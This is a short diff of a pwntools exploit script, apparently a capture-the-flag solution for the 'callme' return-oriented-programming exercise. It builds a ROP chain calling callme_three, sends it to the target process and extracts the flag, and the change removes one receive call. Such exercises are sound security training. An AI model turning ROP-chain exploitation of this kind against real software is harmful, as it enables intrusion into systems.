@@ -33,7 +33,6 @@ rop += p64(0xd00df00dd00df00d)
 rop += p64(ELF.symbols['callme_three'])
 
 log.success(f"ROP chain : {rop}")
-p.recv()
 p.sendline(rop)
 
 flag = p.recvall().split(b'\n')[-2]
